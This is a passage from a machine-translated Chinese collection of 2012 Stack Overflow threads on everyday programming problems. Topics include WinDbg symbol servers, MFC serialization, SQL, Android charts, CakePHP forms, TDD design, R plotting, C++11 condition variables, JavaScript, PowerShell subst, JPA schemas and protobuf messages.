虽然您可以在同一个机器上安装多个版本的 .NET CLR（1.1、2.0、4.0），并通过 .loadby 命令将正确的 SOS.dll 加载到 WinDBG 中，但您可能必须为您支持的那些版本安装多个 Windows .

此外，您还需要这些组件的（公共）符号，包括您​​自己的应用程序的（私有）符号，以进行任何有意义的调试。

考虑到您有 3 个版本的应用程序已交付并仍受支持，运行在您仍支持的 4 个操作系统版本（例如 Windows Vista SP1、Windows 7、Windows 7 SP1 和 Windows 8）上，这为您提供了 12 种符号组合。

这就是符号服务器的用途。您可以使用公共 microsoft 符号服务器，但（当然）不包含您自己的应用程序的符号。

鉴于您描述的应用程序的范围/大小，我认为最好设置一个内部符号服务器。这可以保留客户仍在使用的不同版本的应用程序的所有符号（一项不能掉以轻心的任务）。

推荐阅读：

*   [设置符号服务器](http://entland.homelinux.com/blog/2006/07/06/setting-up-a-symbol-server/)
*   [设置符号服务器给了我什么（SO）](https://stackoverflow.com/questions/2233376/what-does-setting-up-a-symbol-server-give-me)
*   [符号服务器和符号存储 (MSDN)](http://msdn.microsoft.com/en-us/library/windows/desktop/ms680693(v=vs.85).aspx)
*   [使用 Microsoft Symbol Server 获取调试符号文件](http://support.microsoft.com/kb/311503)

您还可以考虑设置[源服务器](http://msdn.microsoft.com/en-us/library/windows/desktop/ms680641(v=vs.85).aspx)，以允许您在调试会话中从源代码管理中获取正确版本的源代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T09:07:22.427

由于没有人能够给我这个问题的真正答案，我将提供我的“解决方法”。到目前为止，我一直在做的是搜索 Microsoft 支持站点以找到框架版本的 ms 更新包，下载它，然后使用 expand.exe 提取它。然后可以将 WinDbg 连接到此版本，而不是运行您正在调试的机器的版本。这是一篇博文，详细解释了该过程[http://sjbdeveloper.blogspot.com.au/2012/10/getting-correct-versions-of-net.html](http://sjbdeveloper.blogspot.com.au/2012/10/getting-correct-versions-of-net.html)

# visual-c++ - 是否可以将 mfc 序列化数据读入更高精度的数据类型？

> ID：12192411
> 
> 赞同：0
> 
> 时间：2012-08-30T08:01:15.537
> 
> 标签：visual-c++, mfc, carchive

我正在使用 VS2010 中的遗留代码，并将许多数据结构从使用 short 和 float 分别移动到使用 int 和 double，以修复许多编译器警告。

但是，这似乎破坏了 mfc 序列化（CArchive），因为我无法再读取旧的序列化数据。我尝试强制转换和使用临时变量，但结果并不令人鼓舞。有些变量被正确读取，有些看起来像溢出的值，所以我真正要寻找的是一种方法来确保“>>”运算符只读取一个短或浮点数。

一种选择当然是恢复到旧结构，但如果可能的话，我想坚持使用“更现代”的数据类型并修复读取序列化数据的过程。这可能吗？如果可以，怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:32:47.877

尝试使用版本架构：

```
 IMPLEMENT_SERIAL(CMyObject, CObject, VERSIONABLE_SCHEMA| new_version_schema)

void CMyObject::Serialize(CArchive& ar) 
{
   if (ar.IsLoading())
   {
      int nVersion = ar.GetObjectSchema();

      switch(nVersion)
      {
      case old_version_schema:
         // read old types short and float convert them to int and double
         break;
      case new_version_schema:
         // read new types int and double
         break;
      default:
         // report unknown version of 
         // this object
         break;
      }
   }
   else
   {
      // new save with int and double
   } 

```

# sql - Sql查询查找最多起始字符

> ID：12192412
> 
> 赞同：0
> 
> 时间：2012-08-30T08:01:18.143
> 
> 标签：sql, sql-server

简化方案，我有一个包含以下字段/值的表：

```
ID  value
1   '12345'
2   '1234'
3   '123'
4   '12'
5   '1' 
```

我想找到最接近 A='1230' 的记录，它应该对应于 ID=3。

我现在想到的唯一实现是基本的......使用循环遍历 A 子字符串并进行比较。有没有更好的方法来解决这个问题？

将感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:11:03.157

尝试这个 ：-

```
Declare @valueToSearch int
Set @valueToSearch =1230

;WITH cte
AS
(
  SELECT ID,RANK() OVER(ORDER BY ABS(value-@valueToSearch)) AS num FROM Sample
)
SELECT   ID FROM cte
WHERE num=(SELECT MIN(num) FROM cte 
```

这将给出 2 作为结果

[Sql 小提琴](http://sqlfiddle.com/#!3/e978e/2)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:08:30.303

```
declare @q varchar(5)
select @q = '1230'

select top 1 number, substring(source.value, 1, number)
from master.dbo.spt_values, source
where type='p'
and number<=len(source.value)
and substring(source.value, 1, number) = substring(@q, 1, number)
order by number desc 
```

或使用类似...

```
select top 1 * from @source s
where @q like value +'%'
order by len(value) desc 
```

# android - 如何“聪明”地将公式翻译成自然语言的形式？

> ID：12192426
> 
> 赞同：1
> 
> 时间：2012-08-30T08:02:16.930
> 
> 标签：android, c++, nlp

我最近正在开展一个旨在评估 android 应用程序是否崩溃的项目。评估过程是：

1.  收集日志（记录应用程序的执行过程）。
2.  生成公式预测结果（公式由GP生成）
3.  通过公式评估日志

现在我可以生成公式，但是为了方便用户，我想把公式翻译成自然语言的形式，告诉用户为什么会发生崩溃。（我认为它看起来像“逆自然语言处理”。）

为了更清楚地解释这个想法，假设你有一个这样的公式：

```
 155 - count(onKeyDown) >= 148 
```

很明显，如果count(onKeyDown) > 7，“155 - count(onKeyDown) >= 148”的结果是假的，所以日志包含超过7个onKeyDown事件将被预测为“失败”。

我想告诉用户，如果 onKeyDown 事件出现超过 7 次（155-148=7），这个应用程序就会崩溃。

但是，真正的公式要复杂得多，例如：

```
(< !( ( SUM( {Att[17]}, Event[5]) <= MAX( {Att[7]}, Att[0] >= Att[11]) OR SUM( {Att[17]}, Event[5]) > MIN( {Att[12]}, 734 > Att[19]) ) OR count(Event[5]) != 1 ) > (< count(Att[4] = Att[3]) >= count(702 != Att[8]) + 348 / SUM( {Att[13]}, 641 < Att[12]) mod 587 - SUM( {Att[13]}, Att[10] < Att[15]) mod MAX( {Att[13]}, Event[2]) + 384 > count(Event[10]) != 1)) 
```

我试图用 C++ 来实现这个功能，但这很困难，这是我现在正在工作[的代码片段。](http://homepage.ntu.edu.tw/~b98901160/question/printNatural.cpp)

有谁知道如何快速实现这个功能？（也许通过一些工具或研究结果？）欢迎任何想法:)

提前致谢。

# xamarin.android - LinearLayout 内的 TChart 生成“宽度和高度必须> 0”

> ID：12192428
> 
> 赞同：0
> 
> 时间：2012-08-30T08:02:21.573
> 
> 标签：xamarin.android, teechart

我刚刚开始在 Mono for Android 上使用 Steema TChart。我尝试了这个简单的代码，它工作正常：

```
protected override void OnCreate(Bundle bundle)
{
    base.OnCreate(bundle);

    var tChart1 = new Steema.TeeChart.TChart(this);
    var bar1 = new Steema.TeeChart.Styles.Bar();
    tChart1.Series.Add(bar1);
    bar1.Add(3, "Pears", Color.Red);
    bar1.Add(4, "Apples", Color.Blue);
    bar1.Add(2, "Oranges", Color.Green);
    var theme = new Steema.TeeChart.Themes.BlackIsBackTheme(tChart1.Chart);
    theme.Apply();

    SetContentView(tChart1);
} 
```

...但是，一旦我尝试将图表添加到另一个视图中，例如 LinearLayout，我就会收到错误“**宽度和高度必须 > 0** ”。有谁知道如何解决这个问题？

这是我尝试过的代码（如果我只有 LinearLayout 和 Button，它就可以正常工作）：

```
protected override void OnCreate(Bundle bundle)
{
    base.OnCreate(bundle);

    var tChart1 = new Steema.TeeChart.TChart(this);
    var bar1 = new Steema.TeeChart.Styles.Bar();
    tChart1.Series.Add(bar1);
    bar1.Add(3, "Pears", Color.Red);
    bar1.Add(4, "Apples", Color.Blue);
    bar1.Add(2, "Oranges", Color.Green);
    var theme = new Steema.TeeChart.Themes.BlackIsBackTheme(tChart1.Chart);
    theme.Apply();

    var container = new LinearLayout(this);
    container.Orientation = Orientation.Vertical;
    var b = new Button(this);
    b.Text = "Test";
    container.AddView(b);
    container.AddView(tChart1);

    SetContentView(container);
} 
```

这里是调用堆栈：

```
08-29 19:39:52.489 I/MonoDroid(24907): java.lang.IllegalArgumentException: width and height must be > 0
08-29 19:39:52.489 I/MonoDroid(24907):  at android.graphics.Bitmap.createBitmap(Bitmap.java:603)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.graphics.Bitmap.createBitmap(Bitmap.java:585)
08-29 19:39:52.489 I/MonoDroid(24907):  at steema.teechart.TChart.n_onDraw(Native Method)
08-29 19:39:52.489 I/MonoDroid(24907):  at steema.teechart.TChart.onDraw(TChart.java:55)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.View.draw(View.java:11025)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.widget.FrameLayout.draw(FrameLayout.java:450)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.drawChild(ViewGroup.java:2887)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.drawChild(ViewGroup.java:2885)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.drawChild(ViewGroup.java:2885)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.drawChild(ViewGroup.java:2885)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.View.draw(View.java:11028)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.widget.FrameLayout.draw(FrameLayout.java:450)
08-29 19:39:52.489 I/MonoDroid(24907):  at com.android.internal.policy.impl.PhoneWindow$DecorView.draw(PhoneWindow.java:2274)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewRootImpl.draw(ViewRootImpl.java:2041)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1647)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2459)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.os.Looper.loop(Looper.java:137)
08-29 19:39:52.489 I/MonoDroid(24907):  at android.app.ActivityThread.main(ActivityThread.java:4514)
08-29 19:39:52.489 I/MonoDroid(24907):  at java.lang.reflect.Method.invokeNative(Native Method)
08-29 19:39:52.489 I/MonoDroid(24907):  at java.lang.reflect.Method.invoke(Method.java:511)
08-29 19:39:52.489 I/MonoDroid(24907):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:790)
08-29 19:39:52.489 I/MonoDroid(24907):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:557)
08-29 19:39:52.489 I/MonoDroid(24907):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T09:21:55.373

这是因为在将图表添加到 View 时需要提供[LayoutParams](http://developer.android.com/reference/android/widget/LinearLayout.LayoutParams.html)，例如：

container.AddView(tChart1, new ViewGroup.LayoutParams(300, 400));

或者：

container.AddView(tChart1, new ViewGroup.LayoutParams(ViewGroup.LayoutParams.FillParent, ViewGroup.LayoutParams.FillParent));

# php - 向提交表单添加字段

> ID：12192432
> 
> 赞同：0
> 
> 时间：2012-08-30T08:02:33.023
> 
> 标签：php, jquery, cakephp

您好我在向表单添加字段并在控制器中检索它们时遇到问题。

我可以在按钮单击时轻松地将字段添加到表单中，该表单使用的是：

```
$('#addButton').click(function()
{
     $('#EBASTab').append($('<tr><td>Hello</td><td><input style="height:' + 10 + 'px; width:' + 100 + 'px;"></input></td></tr>')); 
```

但是当我尝试使用以下方法检索表单数据时：

```
$value = $this->request->data; 
```

我添加到表格底部的字段没有被纳入。

知道如何将这些字段添加到我的 cakephp 表单中吗？

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:04:32.977

没有名称属性，这就是为什么不在帖子数据中。向输入添加一个`name="data[Model][field]"`属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:05:27.750

您需要输入中的名称属性，并使用该名称捕获数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:06:21.227

必须像这样添加

```
$('#EBASTab').append($('<tr><td>Hello</td><td><input type="file" class="uploadFile" name="data[Album][image]">')); 
```

# architecture - TDD、Scrum 和架构：KISS 和复杂性冲突

> ID：12192433
> 
> 赞同：4
> 
> 时间：2012-08-30T08:02:33.820
> 
> 标签：architecture, tdd

我已经按照 Scrum、TDD、领域驱动设计和 Bob 叔叔的食谱工作了一年。但我对我们是否应用了各种原则有一些疑问，主要是在阅读 Martin 的系列中的“Java 应用程序架构”（从现在的 JAA）时. 如果我错了，请纠正我！（希望我是）问题从 TDD 和 Scrum 开始，指出一旦需求出现，我们应该改进系统来实现需求，避免前期设计。这使我的工作使所有可扩展点保持打开状态，（ab）始终使用各种可扩展性模式。这确实有一个“阴暗面”：增加了整个系统的复杂性。我事先不知道我的代码的某个部分是否需要进一步发展。

但是，正如在各处正确说明的那样（在 JAA 上确实经常如此），您应该仅在需要时添加复杂性。这个恕我直言的结论是，应该进行体面的前期分析......与其他食谱相冲突......

因此循环.... aaargh 我讨厌循环依赖！

在“确认”一个特性之后，我们是否应该重构事物以降低复杂性？我们是否应该使用允许的最简单的方法，并且仅在需要时扩展它？例如，当您不需要它们时，不要构建超级解耦的东西吗？

（欢迎任何改进问题风格和内容的建议，我是stackoverflow的新手）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-30T08:16:38.703

> 在“确认”一个特性之后，我们是否应该重构事物以降低复杂性？我们是否应该使用允许的最简单的方法，并且仅在需要时扩展它？例如，当您不需要它们时，不要构建超级解耦的东西吗？

**是**的。虽然这是相当主观的，但我不喜欢可以灵活地改变每一个要改变的东西的系统，而你不会利用所有这些灵活性。不过，您的说法是自相矛盾的：测试驱动开发教会我“做最简单的可能可行的事情”。

如果需要更多功能，您可以添加测试，然后重构和扩展代码以确保它执行您希望它执行的操作。因为您已经进行了测试，所以您可以放心，您不会破坏当前存在的代码。

*简而言之*：不要因为可以而建立灵活性。您应该建立灵活性，因为情况要求您这样做。我坚信“按需”重构会使项目的构建时间比内置（未使用的）灵活性更短。在测试到位后，“按需”重构应该不会花费太长时间。

*更短*：保持简单，愚蠢。;)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-30T08:23:14.277

我相信在使事情变得简单和对系统的一些深入的体系结构理解之间存在平衡。

我试图将短期计划与长期计划分开。在短期规划中，我认为只有几步之遥，如果此功能*可能*会在下一次迭代中扩展/修改/更新，那么我将尝试为此做好准备。但如果我没有预见到任何扩展，我将遵循 KISS 原则。

在长期规划中，我认为至少提前半年。什么是互动，什么是可能的路线图？这给了我一些基本的想法，让我知道我应该在哪里让事情变得更高级一些。

恕我直言，应该在计划和完成短期目标之间做出明智的决定。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-30T08:40:13.397

我怀疑有经验的设计师会带着直觉来进行。做出了“明显的”架构决策，分层，关注点分离设计决策有点“退出”。诀窍是避免分析瘫痪和过度设计。

随着粒度的增加，随着我们越来越接近代码，“你不需要它”的口号变得更加重要——它很容易被美丽的灵活性所束缚。但是你可以通过一些简单的方法来启用future flex。例如，用（在 Java 中）接口表示组件之间的关系。您可能不会选择完全成熟的抽象工厂模式，但如果消费者被编码为一个接口，那么很容易引入一个。同样，不要在代码周围散布字符串文字，而是将它们收集在一个地方，可以大大简化未来的国际化或动态配置，即使现在您不需要外部化字符串。

我看到的真正优秀的设计师似乎玩它就像玩国际象棋或围棋游戏，他们预测未来的动作，但当然在他们需要之前不会播放响应。（围棋术语[aji-keshi](http://c2.com/cgi/wiki?AjiKeshi)可能值得考虑。）

哈这很有趣：我查阅了 aji-keshi 参考来解释这个术语，却发现作者已经将这个术语应用到系统设计中来解决这个问题！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T15:28:35.570

毫无疑问，您应该首先添加做最简单的事情的代码 - 但您添加的代码应该遵守[SOLID](http://en.wikipedia.org/wiki/SOLID_%28object-oriented_design%29)原则。

不要仅仅通过推测未来可能发生的变化来引入复杂性（例如设计模式、框架等）。

[您正在解决的问题的基本复杂性](http://en.wikipedia.org/wiki/Essential_complexity)无法改变。这需要预先思考、头脑风暴，但[意外的复杂](http://en.wikipedia.org/wiki/Accidental_complexity)性会随着猜测而增加。

定期的同行代码审查会有所帮助。如果您的同行可以阅读和理解代码而不会引起注意 - 那么我认为应该没问题..

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-04T12:48:34.303

> 这使我的工作使所有可扩展点保持打开状态，（ab）始终使用各种可扩展性模式。这确实有一个“阴暗面”：增加了整个系统的复杂性。我事先不知道我的代码的某个部分是否需要进一步发展。
> 
> 我们是否应该使用允许的最简单的方法，并且仅在需要时扩展它？

我认为至少可以通过调整您对“简单性”和“复杂性”的定义来解决这个难题。

JAA“秘诀”、 [SOLID](http://en.wikipedia.org/wiki/SOLID_%28object-oriented_design%29)原则等都是管理设计中*耦合*和*内聚*的捷径。如果您将设计的“*简单性*”定义为实现最大内聚和最小耦合的程度，那么您可以说这些原则和模式旨在使您的设计保持**简单**。

因此，根据该定义，您所说的“可扩展点”实际上是保持设计简单的结果，因此不会增加复杂性。此外，它们是否会在未来被用于扩展的目的没有抓住重点，因为简单设计的目的是为了**方便未来的变化**。

短语*“做最简单的事情可能会起作用”*，更多地指的是构建什么的选择，而不是代码的设计。例如，如果您需要显示 HTML 页面，请构建 HTML 页面，而不是 Web 应用程序。

因此，如果您在维护设计的方式上遵循上面对*简单性的定义，并且只构建**最少*的代码来解决任何给定的问题，那么您的代码库将会更小，您的设计也不那么复杂，并且您的应用程序将邀请未来添加功能所需的更改。

**最后一点：**注意你的*测试*对你的设计有什么看法。耦合和内聚问题通常表现为笨重的测试夹具。当您看到这一点时，这表明您已经跳过了一些必要的重构步骤。

# r - 超过 1,000 个独特参数的 R 散点图

> ID：12192434
> 
> 赞同：1
> 
> 时间：2012-08-30T08:02:45.007
> 
> 标签：r, loops, scatter-plot

我有一个`data.frame` `Set`，我使用以下命令来绘制每列（y 轴）的散点图`TmSlope`。

```
pdf("C:Desktop/Documents/RL/Lyzozyme/plots")
par(mfrow=c(2,3))
for(i in seq(1, length(Set),1) ) { 
  plot(Set$Tm.slope,Set[,i],xlab="Tm.slope",type="p",col="red",ylim=c(-0.05,50),xlim=c(0,6))
}
dev.off() 
```

我的问题是如何确保每个绘图的 y 轴都标有唯一的列名？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:06:12.443

要标记轴，`ylab`请在`plot`函数中使用 :。

我不知道您究竟将什么用作数据，但您可以这样做：

```
plot(...,ylab=names(Set)[i]) 
```

# c++ - C++ 11 - condition_variable - wait_until 没有按预期工作

> ID：12192441
> 
> 赞同：3
> 
> 时间：2012-08-30T08:03:00.727
> 
> 标签：c++, c++11, condition-variable

我已经实现了一个示例程序来了解 wait_for 和 wait_until 在 C++11 中是如何工作的。

代码 -

```
#include <iostream>
#include <future>
#include <chrono>
#include <mutex>
#include <condition_variable>
#include <thread>

using namespace std;
using namespace std::chrono;

condition_variable cv;
mutex m;
bool flagValue=false;

int sampleFunction(int a)
{
    cout<<"Executing sampleFunction...";
    cout.flush();
    this_thread::sleep_for(seconds(5));
    cout<<"Done."<<endl;
    return a;
}

void sampleFunctionCond(int a)
{
    lock_guard<mutex> lg(m);
    cout<<"Executing sampleFunctionCond...";
    cout.flush();
    this_thread::sleep_for(seconds(5));
    cout<<"Done."<<endl;
    cout<<"Value : "<<a<<endl;
    flagValue=true;
    cv.notify_one();
    return;
}

int main()
{
   unique_lock<mutex> ul(m);
   future<int> f1=async(launch::async,sampleFunction,10);
   future_status statusF1=f1.wait_for(seconds(1));
   if(statusF1==future_status::ready)
    cout<<"Future is ready"<<endl;
   else if (statusF1==future_status::timeout)
    cout<<"Timeout occurred"<<endl;
   else if (statusF1==future_status::deferred)
    cout<<"Task is deferred"<<endl;
   cout<<"Value : "<<f1.get()<<endl;

   cv_status statusF2;
   thread t1(sampleFunctionCond,20);
   t1.detach();
   while(!flagValue)
   {
       statusF2=cv.wait_until(ul,system_clock::now()+seconds(2));
       if(statusF2==cv_status::timeout)
       {
       cout<<"Timeout occurred."<<endl;
       break;
       }
       else
       {
       cout<<"Condition variable is ready or spurious wake up occurred."<<endl;
       }
   }
} 
```

输出 -

```
Executing sampleFunction...Timeout occurred
Done.
Value : 10
Executing sampleFunctionCond...Done.
Value : 20
Timeout occurred. 
```

sampleFunction 正在按预期工作，因为它在“完成”之前打印“发生超时”，但 sampleFunctionCond 的情况并非如此。虽然它知道 wait_until 已超时，但它会在函数 sampleFunctionCONd 完成执行后打印消息。

有人可以帮我理解吗？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:23:56.610

`statusF2=cv.wait_until(...);`语句中有竞争条件。可能发生的情况是等待已超时并即将返回。要返回它需要重新获取互斥锁。与此同时，另一个线程已经获得了互斥锁。因此，在其他线程设置为 true 并释放互斥锁`statusF2=cv.wait_until(...);`之前，无法返回。`flagValue`

要修复代码，`flagValue`必须在检查等待是否超时之前检查 的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-07T06:43:02.537

函数“sampleFunctionCond”不应该一直持有互斥锁“m”。您可以尝试在“flagValue=true;”行之前立即锁定“m”。

# javascript - 为什么我需要在 setTimeout 中有匿名函数才能使此代码正常工作？

> ID：12192444
> 
> 赞同：1
> 
> 时间：2012-08-30T08:03:06.113
> 
> 标签：javascript, node.js

我正在阅读Nodejs的教程，但我无法理解这段代码，请给我解释一下。

```
function async(arg, callback) {
  console.log('do something with \''+arg+'\', return 1 sec later');
  setTimeout(function() { callback(arg * 2); }, 1000);
}
function final() { console.log('Done', results); }

var items = [ 1, 2, 3, 4, 5, 6 ];
var results = [];
var running = 0;
var limit = 2;

function launcher() {
  while(running < limit && items.length > 0) {
    var item = items.shift();
    async(item, function(result) {
      results.push(result);
      running--;
      if(items.length > 0) {
        launcher();
      } else if(running == 0) {
        final();
      }
    });
    running++;
  }
}

launcher(); 
```

此代码产生 run 2x 然后暂停一秒钟然后再次运行 2x 直到 items 数组中没有项目。

但是当我在 setTimeout 中删除匿名函数时：

```
setTimeout(callback(arg*2), 1000); 
```

然后代码运行没有停止任何一秒钟。为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:17:45.757

> 然后代码运行没有停止任何一秒钟。为什么？

因为不是将函数传递给，而是将函数*调用*`setTimeout`的返回值传递给它。

 *函数调用立即执行，然后`setTimeout`对返回值不做任何事情，因为它（可能）不是字符串或函数。

**不要**删除匿名函数包装器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:14:26.717

The reason the anonymous delegate is needed is because setTimeout expects an object of type `function` as it's first argument.

So you can either give it just a pre-defined function name directly:

```
function foo()
{
//do something
}

setTimeout(foo, 1000); 
```

Or a delegate:

```
setTimeout(function(){/*dosomething*/}, 1000); 
```

But this:

```
setTimeout(foo(param), 1000); 
```

Is invalid because foo(param) isn't semantically correct in this context.

The alternative is to do something like:

```
setTimeout("foo(param);", 1000); 
```

Because setTimeout will also accept a string of a function, but this is a bad idea because you lose the current scope and it's a pain to debug.*

# powershell - Powershell Subst 命令

> ID：12192445
> 
> 赞同：1
> 
> 时间：2012-08-30T08:03:11.383
> 
> 标签：powershell

如何从我的 powershell 配置文件中正确调用 Subst 命令？

这是我尝试过的：

我的 powershell 配置文件中有以下功能：

```
function aa1 {
  Subst "q:" /D
  Subst "q:" $tjb.mypath
} 
```

当我从命令行调用它时它可以工作，但是如果我从我的 powershell 配置文件中调用它，则使用以下行：

```
aa1 
```

在启动新的 powershell 函数时，它给了我以下错误：

```
Invalid parameter -q: 
```

但是，我知道函数的第一行可以正常工作，因为 q: 驱动器消失了。

以下是上述命令的输出示例：

```
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

Invalid parameter - Q:
Invalid parameter - q:
** snip Other unrelated stuff**
> aa1
Invalid parameter - Q:
> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T09:42:39.090

如果您`subst q: /d`在 q: 还不是替代驱动器时这样做，您将收到此错误

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-11-01T19:28:36.310

我建议在运行 subst /D 之前测试驱动器是否已经存在

```
if(Test-Path -Path "q:" -IsValid) {
    # Unsubst the existing q: to make space for a new one
    subst "q:" /D
}
Subst "q:" $tjb.mypath 
```

# javascript - 数组上的 ParseInt() 方法

> ID：12192450
> 
> 赞同：0
> 
> 时间：2012-08-30T08:03:24.913
> 
> 标签：javascript, jquery

我想知道如何从数组中获取数字。我试过它给我 NaN 错误

```
<script type="text/javascript">

$(function(){

var Arr = [ 'h78em', 'w145px', 'w13px' ]

alert(parseInt(Arr[0]))

})
</script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:06:01.930

尝试

```
+Arr[0].replace(/\D/g, ''); 
```

小提琴示例：http: [//jsfiddle.net/t6yCV/](http://jsfiddle.net/t6yCV/)

开始`+`工作就像`parseInt()`，如果您需要对获得的数字执行一些数学运算，则有必要：事实上

```
typeof Arr[0].replace(/\D/g,'')  // String
typeof +Arr[0].replace(/\D/g,'') // Number 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T08:21:44.433

尝试：

```
['h78em', 'w145px', 'w13px']
 .map(function(a){return ~~(a.replace(/\D/g,''));});
 //=> [78, 145, 13] 
```

[也可以看看](https://stackoverflow.com/questions/5971645/what-is-the-double-tilde-operator-in-javascript)

或者使用更复杂的`String`原型扩展：

```
String.prototype.intsFromString = function(combine){
 var nums = this.match(/\d{1,}/g);
 return !nums ? 0 
         : nums.length>1 ? combine ? ~~nums.join('') 
           : nums.map(function(a){return ~~a;}) 
         : ~~nums[0];
};
// usage
'abc23'.intsFromString();          //=> 23
'3abc121cde'.intsFromString();     //=> [3,121]
'3abc121cde'.intsFromString(true); //=> 3121
'abcde'.intsFromString();          //=> 0
// and ofcourse
['h78em', 'w145px', 'w13px'].map(function(a){return a.intsFromString();});
//=> [78, 145, 13] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T11:23:43.570

尝试这个：

```
var Arr = [ 'h78em', 'w145px', 'w13px' ]

function stringToNum(str){
  return str.match(/\d+/g);

}

alert(stringToNum(Arr[0])); 
```

[http://jsfiddle.net/8WwHh/1/](http://jsfiddle.net/8WwHh/1/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T08:06:08.880

您可以构建一个从字符串构建数字的函数：

```
function stringToNum(str){
  num = 0;
  for (i = 0; i < str.length; i++) 
    if (str[i] >= '0' && str[i] <= '9') 
      num = num * 10 + parseInt(str[i]);
  return num;
} 
```

jsFiddle：http: [//jsfiddle.net/8WwHh/](http://jsfiddle.net/8WwHh/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-30T09:02:53.470

试试看，这个正则表达式更好

```
parseInt('h343px'.replace(/^[a-zA-Z]+/,''),10) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-30T08:06:22.617

怎么样

```
alert(parseInt(Arr[0].replace(/[a-z_A-Z]/g,""))); 
```

[jsfiddle](http://jsfiddle.net/ucDxd/1/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-30T08:09:39.713

另一个快速而肮脏的解决方案：

```
alert(Arr[0].match("\\d+")); 
```

# spring - 如何在 JPA/hibernate 中为映射实体/表配置模式名称

> ID：12192453
> 
> 赞同：3
> 
> 时间：2012-08-30T08:03:39.513
> 
> 标签：spring, hibernate, jpa

我有一个应用程序需要在运行时访问 2 个模式，并且在部署时需要配置模式名称，因为每个部署的名称都不同（用于组装测试、集成测试、性能测试......）

我知道 JPA / hibernate 可以在 @Table 注释上指定模式，但我需要使模式可配置，无论如何要添加后处理器 / 事件侦听器，以便我可以修改休眠元信息，并使用我的配置更改表模式?

目前我正在考虑重写我自己的 HibernateJpaVendorAdapter / HibernatePersistence，但这绝对不是一个好主意。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T16:00:07.003

您可能还想调查文件`persistence-unit-defaults`中的元素`META-INF/orm.xml`。这允许您为持久性单元指定默认模式和目录。这可能会也可能不会满足您的需求，具体取决于您如何确定要在代码中访问的架构。另请注意，Hibernate 多年来一直在该领域充满错误。尽管如此，它可能比编写自定义代码更好。

# protocol-buffers - Protobuf：嵌套任意类型的消息

> ID：12192454
> 
> 赞同：8
> 
> 时间：2012-08-30T08:03:40.777
> 
> 标签：protocol-buffers

简而言之，有没有办法定义一个包含另一个任意类型消息的 protobuf 消息？就像是：

```
message OuterMsg {
    required int32 type = 1;
    required Message nestedMsg = 2; //Any sort of message can go here
} 
```

我怀疑有一种方法可以做到这一点，因为在各种 protobuf 实现中，编译的消息从一个公共`Message`基类扩展而来。

否则我想我必须为这样的各种消息创建一个通用的基本消息：

```
message BaseNestedMessage {
    extensions 1 to max;
} 
```

然后做

```
message OuterMessage {
    required int32 type = 1;
    required BaseNestedMessage nestedMsg = 2;
} 
```

这是实现这一目标的唯一方法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-30T08:48:03.803

最流行的方法是为每种消息类型创建可选字段：

```
message UnionMessage
{
    optional MsgType1 msg1 = 1;
    optional MsgType2 msg2 = 2;
    optional MsgType3 msg3 = 3;
} 
```

